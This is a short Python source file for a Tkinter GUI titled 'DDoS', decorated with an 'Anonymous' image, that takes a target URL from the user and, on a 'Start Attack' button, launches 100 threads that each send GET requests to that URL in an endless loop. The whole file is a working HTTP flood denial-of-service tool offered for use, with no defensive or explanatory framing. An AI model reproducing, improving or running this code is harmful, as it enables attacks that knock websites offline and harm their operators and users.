from tkinter import *
from PIL import ImageTk, Image
import requests
import threading
from urllib.request import urlopen
import os


root = Tk()
root.configure(bg="blue")
root.iconbitmap("anonymous_OvV_icon.ico")
root.title("DDoS")


my_img = ImageTk.PhotoImage(Image.open(os.path.join("Assets", "anonymous.png")))
my_label = Label(image=my_img)
my_label.pack()

e = Entry(root, width=50, fg="blue", bg="purple")
e.pack()


def ddos():
    url_target = e.get()
    url = "The url is " + url_target
    url_label = Label(root, text=url, fg="blue", bg="purple")
    url_label.pack()

    ses6 = requests.session()

    def attack():
        while True:
            response = requests.get(url_target)
            response1 = ses6.get(url_target)
            response2 = urlopen(url_target)
            print(response1)
            print(response2.status)
            print(response)
    threads = []

    

    class HTTTThread:
        for i in range(100):
            t = threading.Thread(target=attack)
            t.daemon = True
            threads.append(t)

        for i in range(100):
            threads[i].start()

        for i in range(100):
            threads[i].join()



DDosButton = Button(root, text="Start Attack", fg="blue", bg="purple", command=ddos)
DDosButton.pack()

root.mainloop()
